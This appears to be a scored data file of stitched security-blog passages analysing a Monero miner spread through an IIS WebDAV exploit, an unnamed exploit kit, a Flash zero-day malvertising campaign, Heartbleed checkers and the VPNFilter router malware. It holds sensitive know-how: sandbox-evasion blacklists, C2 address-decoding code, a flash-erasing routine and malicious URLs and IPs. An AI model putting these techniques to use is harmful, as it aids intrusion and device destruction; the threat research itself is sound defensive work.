"The distribution of the miner to victims’ computers is the hardest part of this operation, but even here, the attackers went for the easiest approach. There are two IP addresses that we identified as the source of brute-force scans for the CVE-2017-7269 vulnerability and both point to servers in the Amazon Web Services cloud.",0.012099698351786481
"The vulnerability exploited by the attackers was discovered in March 2017 by Zhiniang Peng and Chen Wu. It is a vulnerability in the WebDAV service that is part of Microsoft IIS version 6.0, the webserver in Windows Server 2003 R2. A dangerous buffer overflow in the ScStoragePathFromUrl function is triggered when the vulnerable server is processing a malicious HTTP request. In particular, a specifically crafted PROPFIND request leads to a buffer overflow due to a reallocation of double sized buffer when the count of Unicode characters is mistakenly provided instead of a byte-count. A very detailed analysis of the mechanism by Javier M. Mellid can be found here. This vulnerability is especially susceptible to exploitation, since it’s located in a webserver service, which in most cases is meant to be visible from the internet and therefore can be easily accessed and exploited by anyone.",0.0062524308697313735
"The payload comes necessarily in the form of an alphanumeric string. The attackers replaced the string leading to the execution of the Windows calculator from the proof-of-concept with one leading to the download and execution of their malicious payload.  However, this didn’t require much sophistication either, as there are online tools like alpha3 that help to convert any shellcode into the desired string.",0.010353824196581263
The shellcode is the expected download-and-execute action (downloading dasHost.exe from hxxt://postgre[.]tk/ into the %TEMP% folder):,0.0084271092844449
Figure3. Shellcode delivered by the exploit,0.008007329281692677
"Based on our data, the very first in-the-wild exploitation of this vulnerability happened just two days after its publication on 26th March 2017 and it has been actively exploited ever since.",0.0135920743961635
"This particular malicious miner was first seen in-the-wild on 26th May 2017. Since then, it has been appearing in waves, on a weekly or less frequent basis, which implies that the attacker scans the internet for vulnerable machines.",0.011347421947919822
Figure4. Graph of infection waves over time,0.013705837452213876
"Scanning is always done from one IP address, which seems to be a machine hosted on an Amazon cloud server that the attacker had rented and deployed their scanning software, and continue to use it to launch their attacks.",0.014166190258404932
Mitigation,0.008231592818215394
ESET detects the malicious binaries of the miner as Win32/CoinMiner.AMW trojan and the exploitation attempts at the network layer under the detection name webDAV/ExplodingCan. This is a real-world example of a packet that would be blocked:,0.012705524919675693
Figure5. Specifically crafted HTTP request with an encoded shellcode,0.0073972161383106805
"Microsoft ended its regular update support for Windows Server 2003 in July 2015 and did not release any patch for this vulnerability until June 2017, when several critical vulnerabilities for its older systems were discovered and brought to the attention of malware authors. The good news is that despite the end-of-life status of the system, Microsoft decided to patch these critical vulnerabilities in order to avoid large-scale destructive attacks similar to the WannaCryptor (aka WannaCry) outbreak. However, keeping Windows Server 2003 up-to-date might be difficult due to the fact that automatic updates don’t always work smoothly (e.g. this blog post by Clint Boessen confirms our own troubles with updating the system). Consequently, many of these systems are still vulnerable to this day. We strongly advise users of Windows Server 2003 to apply KB3197835 and other critical patches as soon as possible (if automatic updates fail then download and install the security update manually!).",0.01633614843414455
Statistics,0.010114094249701555
"Thanks to the mining pool stats being publicly available, we were able to see the combined hash rate of all victims, which represents the computing power dedicated to the mining account. The value seemed to consistently reach around 100 kilohashes per second (kH/s), with a surge of up to 160 kH/s in late August 2017, which we attribute to campaigns launched on August 23 and 30.",0.013165963018300864
"Overall, the infected machines were making approximately XMR5.5 daily by the end of August and have made over XMR420 in total over the course of three months. According to the exchange rate of 150 USD/XMR at the time, these values were equal to USD 825 per day and over USD 63,000 in total, respectively.",0.017485779696084447
"The attackers were very active at the end of August but have gone quiet since early this month with no new infections coming in. Moreover, because the miner has no persistence mechanism, the attackers have slowly begun losing already compromised machines, and the total hash rate has dropped all the way down to 60 kH/s at the time of writing. This is not the first time the attackers took such a break and it is likely a new campaign will be launched in the near future.",0.013356571298628106
"The total number of victims is not known to us, but can be estimated from the total hash rate produced by the attacker. According to the CPU benchmarks, a high-end consumer Intel i7 processor has a hash rate of around 0.3-0.4 kH/s. However, considering the fact that the exploit is limited to systems running Windows Server 2003, which will most likely be running on older hardware with weaker CPUs, the average hash rate per victim will be much lower and the total number of infected machines probably much higher.",0.013721756796240658
Figure6: Statistics of the attackers’ wallet provided by the mining pool,0.010654370802223756
Conclusion,0.008171308922719556
"We see that minimal know-how together with very low operating costs and a low risk of getting caught – in this case, misusing legitimate open-source cryptocurrency mining software and targeting old systems likely to be left unpatched – can be sufficient for securing a relatively high outcome.",0.014180965382370458
"Sometimes it takes very little to gain a lot, and this is especially true in today’s world of cybersecurity, where even well-documented, long-known and warned about vulnerabilities are still very effective due to the lack of awareness of many users.",0.013251560830617737
IoCs,0.007797621120042231
Download Site:,0.008381128846103869
hxxp://postgre.tk,0.009274073987038833
hxxp://ntpserver.tk,0.012440681446758473
Source IPs:,0.00882844840969832
54.197.4.10,0.009122401949705594
52.207.232.106,0.009994592238310784
18.220.190.151,0.009105655344081698
Hashes:,0.00898540770617573
31721AE37835F792EE792D8324E307BA423277AE,0.00962817784580583
A0BC6EA2BFA1D3D895FE8E706737D490D5FE3987,0.009753329849043202
37D4CC67351B2BD8067AB99973C4AFD7090DB1E9,0.009808445154451118
0902181D1B9433B5616763646A089B1BDF428262,0.00955622935565914
0AB00045D0D403F2D8F8865120C1089C09BA4FEE,0.010404287832774362
11D7694987A32A91FB766BA221F9A2DE3C06D173,0.00975191804295339
9FCB3943660203E99C348F17A8801BA077F7CB40,0.010338317587585966
52413AE19BBCDB9339D38A6F305E040FE83DEE1B,0.010108705659310324
If you are interested in this topic you might also be interested in the following:,0.011014364172103108
https://www.welivesecurity.com/2017/09/14/cryptocurrency-web-mining-union-profit/,0.010856261472376838
https://www.welivesecurity.com/2017/09/12/cryptocurrency-state-sponsorship/,0.01124022919981671
"Image Credit: © Markéta Fialová
",0.011124748728267186
"Shining some light on the ‘Unknown’ Exploit Kit
Every now and again we come across new URL patterns when investigating traffic captures. In some cases, they are variations of existing redirectors or exploit kits which play the cat-and-mouse game with security researchers, other times they are the indication of a new threat.
But what makes something ‘new’, and how can you be sure that it is indeed something truly novel? Unless you have tracked the drive-by / exploit kit scene from day one or been able to map it out down to the tiniest details, this is not something easy.
There are a few reasons for this. For one, the landscape is vast and ever-changing, bringing an overwhelming amount of information that needs to be dissected and categorized.
Secondly, much of what we see is what the bad guys are showing us, which essentially means client-side traffic.
What about the back-end structure, the actual actors in this ecosystem?
Thankfully we do get the chance to look at it thanks to the relentless work of dedicated researchers such as @kafeine. But sometimes, there are still some things that are left unclear or may confuse some of us (including the author of this article).
When a security researcher stumbles upon something he does not recognize, he often calls it ‘unknown’ for the lack of information needed to give it a proper name.
This post will dig into such a case that has been floating around for some time now and may finally get a chance to have enough exposure to be categorized.
The ‘Unknown’ Exploit Kit
A couple of weeks ago, we observed a new traffic pattern (new to us) that first caught our attention for a couple of reasons:",0.013366583361412054
"The payload’s size did not match that of any URL from the capture
The URL patterns were new",0.009692799568716826
"Before diving into the exploit kit itself, let’s first take a look at how we got there.
Redirection chain
Raw traffic:",0.014046860232427516
"Traffic highlights:
hxxp://flyclick.biz/click?app=app8&click=c7d3c12b-1e98-4cde-b4a1-36b9e8acd624&search=7c9ec1c9-b3ac-4a88-a99f-c95bb7c07d02&feed=18418
HTTP/1.1 302 Found
Server: nginx
Date: Wed, 20 Aug 2014 11:19:58 GMT
Connection: keep-alive
Location: http://chokoboko.com/reject/
Content-Length: 0
hxxp://chokoboko.com/reject/
//document.write(""http://flyclick.biz/click?app=app20&click=d4467442-220a-4890-9157-57bddb24bcbd&search=765b6198-a556-4367-9633-8adb52afcf8e&feed=18398"");
hxxp://flyclick.biz/click?app=app20&click=d4467442-220a-4890-9157-57bddb24bcbd&search=765b6198-a556-4367-9633-8adb52afcf8e&feed=18398
HTTP/1.1 302 Found
Server: nginx
Date: Wed, 20 Aug 2014 11:20:01 GMT
Connection: keep-alive
Location: http://color-finance.com/preview.php
Content-Length: 0
hxxp://color-finance.com/preview.php
<iframe width=""100px"" height=""100"" src=""http://46.229.172.100/?link=beba101f-36a6-4598-71f9-0e61e3554507&pid=1356"" border=""0"" scrolling=""no"">
hxxp://46.229.172.100/?link=beba101f-36a6-4598-71f9-0e61e3554507&pid=1356
HTTP/1.1 303 See Other
Content-Type: text/plain
Location: http://109.206.160.239/click.php?id=pyTaT8AKcaTIksmgJNHIS0ScSv6TIH81L5CTvXcE2_XQKhh-xjI5zlT-Ug3DP_f7lKVFHULQP0wW8juws3MOIKNAX-LVRn2iw_ejzP98UJc%2C
Date: Wed, 20 Aug 2014 19:22:09 GMT
Content-Length: 173
hxxp://109.206.160.239/click.php?id=pyTaT8AKcaTIksmgJNHIS0ScSv6TIH81L5CTvXcE2_XQKhh-xjI5zlT-Ug3DP_f7lKVFHULQP0wW8juws3MOIKNAX-LVRn2iw_ejzP98UJc%2C
HTTP/1.1 302 Moved Temporarily
Server: nginx
Date: Wed, 20 Aug 2014 09:15:53 GMT
Content-Type: text/html; charset=utf-8
Connection: keep-alive
Set-Cookie: goal=31102%7Ccolor-finance.com%7CGBR%7Cbluelakes%7C66734%7Csanyo+troubleshooting; expires=Thu, 21-Aug-2014 11:20:38 GMT; path=/; domain=.bizzclick.com
Location: http://www.inpoucher.com/video2014/index.php?said=do1okr03df315a
Content-Length: 0
hxxp://www.inpoucher.com/video2014/index.php?said=do1okr03df315a
<i frame vspace=""0"" marginheight=""0"" marginwidth=""0"" hspace=""0"" scrolling=""no"" width=""13"" height=""12"" src=""hxxp://www.pizzanetp.com/nhqdxa/eipm.php"" frameborder=""0""></I FRAME>
This last web session leads to the unknown exploit kit’s landing page.
Landing page:
hxxp://www.pizzanetp.com/nhqdxa/eipm.php
Domains on that IP address (76.74.157.161):",0.013566623311704218
"www.sempikoa.com
www.inpoucher.com
www.pizzanetp.com
www.theyfenako.com
www.webinarster.com",0.014332552840253143
"Here is some additional information on the IP address from VirusTotal:
Earliest recorded event for the pizzanetp.com domain:",0.011066767075819328
Earlier record for two of the other domains:,0.008965510298829638
Link with previous research:,0.009880588232363374
The structure of the URL and IP matches one found earlier by @MalwareSigs on IP 72.51.47.69:,0.009573463961316975
"Credits to @kafeine, @MalwareSigs, @malware_traffic for their hard work.
Exploit Kit overview",0.007523535381884328
"This exploit kit targets two different pieces of software: Microsoft Silverlight and Adobe Flash. However, unlike some other exploit kits it will only push one exploit per load giving preference to Silverlight first and then Flash.
Attack paths
Silverlight only:",0.01814232098125712
Flash only:,0.008010948538873519
Silverlight and Flash:,0.006696957594805153
All three successful paths lead to either a:,0.01129988820072203
"Silverlight exploit
Flash exploit",0.006363426527503768
Case #1: Silverlight exploit scenario,0.00801121691180795
"Landing page
URL: hxxp://www.pizzanetp.com/nhqdxa/eipm.php (static name)",0.01186129763302124
Deobfuscated highlights:,0.00868672402402737
"Silverlight exploit
URL: hxxp://www.pizzanetp.com/nhqdxa/vpclcy.x (static name)",0.009678067835598547
"Version used: 5.1.10411.0
CVE-2013-0074
VirusTotal detection: (4/55)",0.011184950868400323
Here’s the Silverlight object required to fire the exploit:,0.007447092047389359
Here’s the call to the API (InternetOpenUrlA) used for the exploit (memory leak):,0.01250781849924476
"After loading shellcode in memory, it can run the payload from the heap with read and write privileges:",0.006494050630938886
Now the DLL is invoked and the system infected (note that the dropped DLL name is randomized each time):,0.00895219021302407
Case #2: Flash exploit scenario,0.007072956682087517
"Landing page
Same as case #1.
Flash exploit
URL: hxxp://www.pizzanetp.com/nhqdxa/oujyt.swf (static name)",0.009251275780183588
"Version used: 11.3.300.273
VirusTotal detection: (7/54) and metadata:",0.008807530869012647
Payload,0.009121200219477266
Silverlight initiated payload: hxxp://www.pizzanetp.com/nhqdxa/yztl.php (static name),0.01010194914771334
Hash: ba9d1976118c944bc70a200a6bfd961c75bc534ec0a7e687ad7f13db403b7280,0.00989930794681304
Flash initiated payload: hxxp://www.pizzanetp.com/nhqdxa/gjtzssq.php (static name),0.010679004981826945
"Hash: a190900ee5bfd20e0e4e79a361905c0244a526def158a7dae72a8a81cf994b46
Both files are the same payload even if their size differs. This is due to the encoding/decoding routines specific to Silverlight and Flash.
Evasion techniques
The malware retrieves a list of installed services by enumerating the following registry key:
HKLM\SYSTEM\ControlSet001\Services",0.01000815784347897
"Blacklisted services (virtualization products):
vmicexchange
vmci
vmdebug
vmmouse
VMTools
VMMEMCTL
vmware
vmx86
vpc-s3
vpcuhub
msvmmouf
VBoxMouse
VBoxGuest
VBoxSF
xenevtchn
xennet
xennet6
xensvc
xenvdb
The malware retrieves a list of running processes by executing a WMI script (“Select * from Win32_Process“)",0.01496399395044068
"Blacklisted processes (virtualization products, sandboxes, and analyst tools):",0.01072260801357805
"vmware
vmount2
vmusrvc
vmsrvc
VboxService
vboxtray
xenservice
joeboxserver
joeboxcontrol
wireshark
sniff_hit
sysAnalyzer
filemon
procexp
procmon
regmon
autoruns
The malware retrieves a list of files in the system32 (%windir%\system32) directory and looks for blacklisted files (virtualization products):",0.014749040471293773
"xenvdb
hgfs.sys
vmhgfs.sys
prleth.sys
prlfs.sys
prlmouse.sys
prlvideo.sys
prl_pv32.sys
vpc-s3.sys
vmsrvc.sys
vmx86.sys
vmnet.sys
Payload details
Google Chrome (version 36.0.1985) is downloaded from a remote server:
hxxp://109.206.180.132/hfudk435k/cn.36.2?i=7BF06358932C9C6CF9DA699098A7006E&a=136&b=190963631",0.010727795029359943
"Named “browser.exe”, the chrome exe, it creates a folder in the user’s appdata folder, named by joining two strings:
First list:
Game,Tool,Utility,Sysutil,Browser,Navigator,Modulator,Receiver,Calculator,Validator,UI,Provider,Teller,Narrator,Supporter,Volunteer,Vinyl,Polyester,Cotton,Whisky
Second list:
Visual,Optional,Jawa,Software,Assistant,Model,Gravity,Higgs,Medium,Noteworthy,Pale,Infinity,Voice,Sync,Joint,Mobile,Wireless,Radio,Humble,Beerware
On the analysis machine, the path to Chrome was “C:\Documents and Settings\Administrator\Local Settings\Application Data\SupporterSoftware\ToolModel\browser.exe”
The malware DLL is remotely loaded into chrome and the main thread resumes.",0.012440035694724516
"This process is created in a suspended state, with an additional URL argument:
""C:\Documents and Settings\Administrator\Local Settings\Application Data\SupporterSoftware\ToolModel\browser.exe"" --load-extension=""C:\Documents and Settings\Administrator\Local Settings\Application Data\SupporterSoftware\UtilityMedium"" http://206.51.231.110/jNryH6/dERkj82cbbR2?t=41170B8939AF1570CD8993627E6CA162&o=145&y=1",0.006991791904150446
"Here is the source code of that URL:
<html><title>144.76.80.177|searchaccess.com|60,93,45,68|</title><script>window.setTimeout(function () { window.location=""http://searchaccess.com/?search=scrabble+word+finder&JdueHdbS=http%3A%2F%2Fflyclick.biz%2Fclick%...""; }, 8000);</script></html>
searchaccess.com displays a “not active” message:",0.010790907848397535
But let’s not get fooled by this. Here’s how Google indexed the server:,0.013147752923974632
And here is the WHOIS information which does raise some eyebrows:,0.00999989171134541
"Additional search on the domain shows that its Name Servers used to (first seen 2013-12-30 13:40:36 -0000) resolve to:
searchaccess.com. NS buy.internettraffic.com
searchaccess.com. NS sell.internettraffic.com
Correlating those NS, we can find interesting information about click fraud activity.
If you are infected with this piece of malware, please read this removal guide from Pieter Arntz.
Conclusions
The payload appears to be a browser hijack whose goal is to illegally gain advertising revenue from infected computers.
What is perhaps more puzzling is the fact that this exploit kit has been around for so long and yet has been so quiet, not to mention the fact that reproducing an infection even with the proper referers is rather difficult (IP blacklisting, geolocation, etc).
Another big question remains: Why would the author(s) bother with such advanced fingerprinting and evasion techniques, something we don’t normally see in typical malware.
It seems that this bit of research has brought up more questions than when we started. That is not unusual though, and at least some dots have been connected.
With additional contributions from David Sanchez, Joshua Cannell and Steven Burn.
@jeromesegura
",0.012536468891397146
"HanJuan EK fires third Flash Player 0day
A new Adobe Flash zero-day, the third one this year so far, has been found in the wild via drive-by download attacks, according to firm TrendMicro.
According to our telemetry, Malwarebytes Anti-Exploit has been blocking this zero-day since around December 10th, 2014.
Adobe released a security advisory and assigned the vulnerability as CVE-2015-0313 and rated it critical:
A critical vulnerability (CVE-2015-0313) exists in Adobe Flash Player 16.0.0.296 and earlier versions for Windows and Macintosh.  Successful exploitation could cause a crash and potentially allow an attacker to take control of the affected system.  We are aware of reports that this vulnerability is being actively exploited in the wild via drive-by-download attacks against systems running Internet Explorer and Firefox on Windows 8.1 and below.
Unsuspected users are redirected to the HanJuan Exploit Kit (thanks Kafeine) via the delivery.first-impression.com (EngageBDR) ad network:",0.01221603001985272
We have tracked this malvertising on some major websites including:,0.013021391770619006
"dailymotion.com
theblaze.com
nydailynews.com
tagged.com
webmail.earthlink.net
mail.twc.com
my.juno.com",0.01705809167740835
"The delivery mechanism is straightforward:
The malicious ad won the bidding process to get displayed for the small cost of $0.927 per impression.
The HanJuan Exploit Kit finishes the infection by exploiting CVE-2015-0313 (Flash 0day):",0.01042113091977126
"Malwarebytes Anti-Exploit users were safe thanks to our multi-layer, signature-less engine:",0.008370363658935842
"As mentioned earlier, this zero-day has been active and infecting people for some time (thanks Timo Hirvonen for the confirmation).
Adobe is aware of the vulnerability and working on a fix that it says it will release sometime this week.
Since this is an activate (and unpatched) threat, we advise extreme caution. Disabling Flash mitigates the risk but also degrades the browsing experience dramatically.
A combination of Malwarebytes Anti-Exploit and Anti-Malware remains one of the best lines of defence to defeat drive-by downloads and zero-days.
",0.013787734931405171
"Users Affected the Most as Heartbleed Takes Center Stage
[Update April 14, 2014 06:00 AM] We updated the list of services at the end of this post to include recently discovered tools and suggestions by some of our readers.
Original post:
When someone in your family who’s probably not as computer and internet savvy as you starts asking you about Heartbleed, you know that this online threat has hit mainstream.
Heartbleed, which is officially referenced as CVE-2014-0160, is a serious weakness or bug on websites that are using the OpenSSL cryptographic protocols.
If hackers take advantage of this, they can retrieve encryption keys that can be used to decrypt sensitive information that users would normally protect or keep private, such as email exchanges, IM chat messages, usernames and passwords and credit card numbers.
This bug has reportedly been around for two years, but was only recently found and made public by a Google Security researcher and Codenomicon, the company behind Heartbleed.com, an informative FAQ site devoted to educating and addressing major queries from curious and concerned netizens.
It may seem that this flaw can only be exploited from the server side; however, nothing can be further from the truth.
“Vulnerable OpenSSL implementations on the client side can be attacked using malicious servers to extract passwords and cryptographic keys ,” A security professional with the SANS Institute told The Register. “It’s an attack that would probably yield handy amounts of data if deployed against users of public Wi-Fi hotspots, for example.”
Like online providers who are affected by Heartbleed, internet users are also asked to mitigate possible threats brought about by the bug before it’s too late.
We have below a handy list of services you may find useful to protect your system and your privacy:",0.010673856903902657
"Heartbleed Test. This is a website you can use to check if the domain you’re visiting is vulnerable to the Heartbleed bug.
LastPass Heartbleed Checker. Another site checker similar to Heartbleed Test, this time brought to us by the makers of LastPass, a popular password management software.
LastPass. If you, dear Reader, would like to update passwords of all your accounts from online providers that found were vulnerable to Heartbleed, LastPass (and others like it) can make password generation and remembering a breeze.
Chromebleed. This is a browser extension for Chrome users that is capable of displaying warnings to users if the site they visited is affected by Heartbleed. Majority of the reviewers, however, express their disappointment for the app’s intrusiveness. If this is a concern, you may opt to just use the first two checkers I mentioned above.
Janet Certificate Service. This is a service that replaces certificates of websites owned by universities, colleges, and research organizations affected by the bug.
Alternatives to OpenSSL. Users and online service providers may also consider using alternative cryptographic protocols. We can’t, however, vouch for their effectiveness as we haven’t tested them ourselves. Thanks to commenter Matt Howard for the suggestion.
Heartbleed Detector. Our friends at Lookout created this smartphone app to let users know if their mobile OS is vulnerable to Heartbleed or not. You can read more about it in their blog post here.",0.016727003577097
"If you have other tools or site sources in mind that you think we should include in the list, please leave us a comment.
Jovi Umawing
",0.012533676512402558
PRODUCTS & SERVICES,0.010734820384793453
"VPNFilter botnet: a SophosLabs analysis, part 2",0.00898544442155813
"The second part of our technical investigation of the malicious components involved in the attack that infected over 500,000 routers and network storage devices.",0.010887278509867704
"Written by
Sergei Shevchenko,",0.00997719206866754
Andrew Brandt,0.008937450115869772
"May 27, 2018",0.00857806393957572
Products & Services SophosLabs Uncut Threat Research SophosLabs,0.011000672905358555
"As mentioned in our previous report about VPNFilter malware, the 1st stage implant relies on connecting either to one of twelve hardcoded Photobucket URLs, or the Toknowall website, to fetch an image that had been specially crafted to contain an encoded form of the command-and-control server’s IP address. The stage 1 sample extracts the address from the image’s EXIF metadata.
Using samples provided by the Cyber Threat Alliance, we infected a router that has network-attached storage features with the VPNFilter malware, and observed its behavior and network traffic over several days. The device we infected was not on the list of affected devices published by Cisco Systems in their report, but behaved in ways that Cisco’s original report accurately described.
When performing this and subsequent HTTP requests, the malware used one of a variety of hardcoded User-Agent strings that do not accurately reflect the operating system or application origin of the request (which is coming from the network device itself), and potentially may be misleading to investigators.
It then begins querying Photobucket and/or Toknowall for the image files. During our observations, the infected router attempted to perform an HTTP HEAD request to different Photobucket galleries at random intervals. We also observed one of the provided samples only query ipify.org and then delete itself from the device.
Curiously, it seemed like the samples we ran have a propensity to query certain URLs on Photobucket more frequently than others. Most of the Photobucket galleries used by the malware authors were named after famous female entertainers, such as Jennifer Aniston, Monica Bellucci, Amanda Seyfried, or Eva Green, though in some cases the names were slightly misspelled. After 48 hours of continuous operation, nearly 15% of the more than 440 queries made by the samples we ran attempted to connect to the eva_green1 Photobucket gallery; queries to the rest of the galleries were distributed more evenly. Admittedly, this may just be a consequence of the specific samples that ran in the environment we used for testing, the nature of the pseudo-random algorithm, or maybe our malware author just really has a thing for this French actress who portrayed the Vanessa Ives character in the series Penny Dreadful.",0.016204613511289767
"The malware code indicated that it should query for its command-and-control server address every 10 to 19 seconds, but we observed that it performed a HTTP HEAD request against various pages on Photobucket at a much slower rate, with a random delay of 2 to 20 minutes between the attempts. If the Photobucket URLs fail, it tries to reach Toknowall C2 website, as shown below:",0.01282838953139942
"(NOTE: the domain request above was redirected to the live C2 IP 188.165.218.31.)
The returned JPEG contains 6 numbers as GPS coordinates within its EXIF header. The example above highlights these numbers: 0x67, 0x18, 0xFFFFFF4b, 0x0E, 0x08, and 0xFFFFFF66. The implant takes them as decimal numbers and groups into 2 strings:",0.01185366842929525
"latitude: “103 24 -181”
longitude: “14 8 -154”",0.014072333690336891
"These strings are then scanned into integer values and used to calculate full IP address:
sscanf(latitude, ""%d %d %d"", &delta1, &oct1, &oct2);
sscanf(longitude, ""%d %d %d"", &delta2, &oct3, &num);
oct4 = num + delta2 + 180;
delta1 += 90;
delta2 += 180;
sprintf(IP, ""%u.%u.%u.%u"", oct1 + delta1, oct2 + delta1, oct3 + delta2, oct4);
The numbers above will convert into 217.12.202.40. As shown in the traffic snapshot above, this IP is then immediately probed on port 443.
During the investigation, we have collected a number of images from live Photobucket URLs and Toknowall C2 website. All of these messages contain a hidden IP address in them, such as 91.200.13.76, 91.121.109.209, 94.242.222.68, and the aforementioned 217.12.202.40:",0.014592812317246184
"If the malware is unable to contact either the Photobucket URLs or the Toknowall C2 website (all of which are offline as we write this), the implant resorts to a backup method, explained below.
Listening socket
VPNFilter calls all socket functions by using  system call, which is invoked using int 0x80 interrupt:
sys_socketcall  proc  near
...
mov   eax, 102 ; ""socketcall""
int   80h
The sys_socketcall() accepts a parameter that specifies what socket function needs to be called. For example, to receive data , sys_socketcall() is passed SYS_RECVFROM (12). To create a socket , sys_socketcall() is called with an argument of SYS_SOCKET (1):
sys_socket      proc  near
...
push  1 ; SYS_SOCKET
call  sys_socketcall
VPNFilter first creates a packet socket listener that can sniff all Ethernet frames, which include all kinds of IP packets:
sock_raw = sys_socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
where:",0.019075044231322558
"PF_PACKET and SOCK_RAW specify a “packet” socket type – a very powerful feature in Linux that bypasses the kernel network stack
the Ethernet frame type to accept is set to ETH_P_ALL, meaning that all protocol packets will be received",0.016339481240513876
"This means that VPNFilter can act like the WireShark network packet recording software – a global network tap for any traffic that flows through a compromised device.
The bot obtains the external IP from:
http://api.ipify.org?format=json",0.009740955358289671
"In this screenshot, the VPNFilter malware (labeled “sample_06”) is seen running in the process list of an infected router, while, at the same time, a network socket is opened to api.ipify.com (50.19.229.252).
After this, it sets a future time, defined as a random period from 5 to 10 hours from the current time:
random = PRNG();
future_time = sys_time(0) + random % 18000 + 18000;
Once the time defined above comes, the malware will receive data on a listening socket into a 1,500-byte long buffer:
num = sys_recvfrom(sock_raw, buf_1500, 1500, 0, 0, 0);
The received data is scanned to make sure it contains the same IP address that it retrieved using the api.ipify.org website. Next it checks to make sure this data contains the marker 0x2B22150C, as described in the original report from Cisco.
Once the sanity checks are done, the malware retrieves the 2nd stage C2 IP.
If the 2nd stage payload is successfully retrieved, the malware closes the listening socket, and the implant executes the payload. Otherwise, it will stay in the listening state, thus blocking the code flow until new data arrives.
Certificate Authority Root certificates
We also observed that some of the malware samples contained at least two embedded Certificate Authority Root certificates. The certificates, with unusually long 10-year validity periods, were not legitimately issued by a certificate authority and are, appropriately, labeled as untrusted when viewed in an operating system.
The fake CA root certificate embedded in the samples falsely claims that it was issued by Microsoft:",0.015744971243807804
"So why embed CA root certificates?
The most likely reason is that the malware could, in theory, use these certificates to perform man-in-the-middle decryption of SSL or TLS traffic flowing through the infected device. When you consider that the malware has capabilities of recording all network traffic, it seems reasonable to presume that the malware operators would want to MITM sensitive traffic and not just plain HTTP.
Potentially destructive payload
The original Cisco report, echoed in a public FBI notification about the malware, mentions a potentially destructive payload that is able to “brick” infected devices, effectively rendering small office and home office routers inoperable. But in our analysis, we came to a different conclusion.
We believe that the “kill” command found in the samples we analysed is designed not to kill the router, but to uninstall the malware itself (though it is possible that the previously-described router bricking functionality may have been present in some earlier samples of VPNFilter).
That said, the samples of VPNFilter we analysed do contain a different functionality (not related to the “kill” command) that manipulates MTD (Memory Technology Devices) devices, which are special NAND- or NOR-based flash memory chips used to store non-volatile data, such as boot images. This functionality, however, does not appear to be used.
Given it is present in the malware sample, it is still important to understand what exactly the attackers were planning to do with this function.
The code of this function obtains the list of MTD, by reading /proc/mtd file. The output will list the MTD partitions, which act as independent devices, such as:
cat /proc/mtd
dev:    size   erasesize  name
mtd0: 00030000 00010000 ""u-boot""
mtd1: 00010000 00010000 ""factory""
mtd2: 01fb0000 00010000 ""firmware""
mtd3: 0011115b 00010000 ""kernel""
mtd4: 01e9eea5 00010000 ""rootfs""
Next, the malware parses the list, looking for those partitions that have a name with one of the following strings in it:",0.014419295492767326
"""linux""
""kernel""
""rootfs""",0.010560289335656114
"If it finds such MTD partition, it builds a device name, such as “/dev/mtd3“.
Next, it opens the MTD device with sys_open() call, and obtains its memory information with the kernel IOCTL system call sys_ioctl(), using parameter MEMGETINFO (0x80204D01). The original content of MTD is saved into a temporary buffer.
The MTD segments are then repeatedly unlocked with MEMUNLOCK(0x40084D06), and erased with MEMERASE (0x40084D02) parameters of IOCTL system calls, doing it in the same fashion as described in this article.
Finally, the MTD device is overwritten with an arbitrary block of data, using sys_write() system call. The block of data it overwrites MTD with consists of original data, patched with the supplied buffer of data from the end. That is, if the supplied buffer of data has the size of MTD, it will overwrite the entire MTD. If its size is only a quarter of MTD, only the last quarter of MTD will be overwritten with it.
If the supplied block of data is large enough and consists of zeroes, the MTD partition will be erased, potentially “bricking” the device. Depending on the data provided, the firmware can effectively be re-flashed.
Hence, this function was likely designed to re-flash the compromised device with new firmware, giving it new functionality such as hidden backdoors. At the same time, whether intentionally or not, it may wipe-out critical MTD partitions, rendering the compromised device inoperable.
It’s not clear why this unused function is present in the malware body. It could potentially be in a testing, soon-to-be-released phase. Or, this block of code could have been un-plugged from the rest of the code due to its instability or uselessness.
So, how did the attack get started?
Short answer: we don’t know.
Nevertheless, as mentioned in the previous post, the 1st stage dropper was submitted to VirusTotal on 12 June 2017, from a user in Taiwan. The file submitted by this Patient Zero had a filename qsync.php.
At about the same time the first sample was submitted, multiple users from around the world reported strange behaviour happening with their network-attached storage (NAS) devices.
The victims identified 2 offensive processes found on NAS: qsync.php and vpnfilter:",0.0121270240776159
"One forum user seeking tech support advice posted a screenshot of his NAS user interface, saying “I have unknown user login every time when reboot NAS.”:",0.0182770812520352
"The IP shown in the logs is 222.186.56.233, which is located in China. Multiple users have reported complaints about attempted brute-force logins to their NAS devices originating from this IP, back in December, 2017 :",0.010464914968264405
"It’s evident from these reports that the attackers attempted to log in with admin account. Some reports mention authentication page located at /cgi-bin/authLogin.cgi, also known to be used in a wide-spread Shellshock attack from 2014.
Same page was involved in another, more recent exploit (CVE-2017-17033). This particular one is based on unbounded sprintf() call with user-supplied input within authLogin.cgi. Since it was only reported on 11 December 2017, this could have been a zero-day exploit at the time of an alleged attack.
With thousands of NAS devices exposing their login panels to Shodan, the attackers have a quick way to discover their targets:",0.009249067043689885
"With the targets identified, the attackers may have undertaken a simple credentials’ brute-forcing attack, or a craftier attack that involved a well-known exploit, such as Shellshock, or a different exploit that at the time of attack was zero-day or stays zero-day up until today.
Recommendations",0.011823929088854546
"Regardless of whether you think your device has been hacked, power cycle the device, flash the latest firmware over the top of whatever’s on there, and perform a factory reset on the firmware (this shouldn’t result in file loss on NAS devices, just a reset of all configured settings, which you’ll have to redo)
Change the default passwords for ALL administrator accounts to something complex and unique before reconnecting it to the network. Use a password manager to keep track of them
Never put a NAS device on the DMZ of your network, where it can be reached from the public Internet",0.011835840726088231
Share on Facebook,0.00998712431791049
Share on Twitter,0.009909977340160525
Share on LinkedIn,0.009855679767380665
"1
",0.011966970221767848
